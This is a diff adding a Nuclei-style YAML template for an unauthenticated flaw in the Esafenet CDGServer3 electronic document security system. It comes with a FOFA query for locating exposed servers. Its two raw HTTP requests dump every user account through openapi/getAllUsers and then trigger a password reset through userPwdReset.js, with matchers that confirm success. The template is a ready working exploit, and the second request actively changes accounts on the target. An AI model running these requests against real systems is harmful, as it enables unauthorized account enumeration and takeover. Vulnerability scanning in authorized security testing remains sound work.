@@ -1,0 +1,43 @@
+id: esafenet-cdgserver3-getAllUsers-unauth
+info:
+  name: 亿赛通电子文档安全管理系统 getAllUsers - 身份绕过漏洞
+  author: leadlife
+  severity: high
+  description: todo
+  reference: 
+    - https://github.com/wy876/POC/blob/c19942e30121f116548ca14c0375ba6c8560afeb/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FgetAllUsers%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
+  tags: esafenet,unauth
+
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/openapi/getAllUsers HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 27
+
+        pageSize=10000&pageNumber=1
+      
+      - |
+        POST /CDGServer3/rpc/userManage/userPwdReset.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 12
+
+        userIds=test
+          
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains_all(body_1,'message','success')
+          - contains_all(body_2,'msg','修改成功')
+        condition: and
